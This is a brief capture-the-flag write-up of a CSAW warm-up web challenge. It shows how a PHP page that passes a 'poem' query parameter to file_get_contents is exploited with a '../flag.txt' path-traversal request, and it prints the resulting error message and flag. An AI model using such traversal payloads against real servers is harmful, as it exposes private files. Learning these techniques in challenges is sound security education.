# warm-up/poem-collection

>warm-up/poem-collection

>25 Points\
>Hey! I made a cool website that shows off my favorite poems. See if you can find flag.txt somewhere!\
>http://web.chal.csaw.io:5003

***

Clicking on a poem in this site redirects to "http://web.chal.csaw.io:5003/poems/?poem=poem3.txt"

So attempted to change the URL to point to a flag with 
```
http://web.chal.csaw.io:5003/poems/?poem=flag.txt
```

which gave the error 
```
Warning:  file_get_contents(flag.txt): failed to open stream: No such file or directory in /var/www/html/poems/index.php on line 4
```

Noticing that the given ?poem goes directly into the script, I quickly tried a few versions to see if I could navigate the directory
```
http://web.chal.csaw.io:5003/poems/?poem=./flag.txt
```
and
```
http://web.chal.csaw.io:5003/poems/?poem=../flag.txt
```

which resulted in the desired flag,
```
flag{l0c4l_f1l3_1nclusi0n_f0r_7h3_w1n}
```
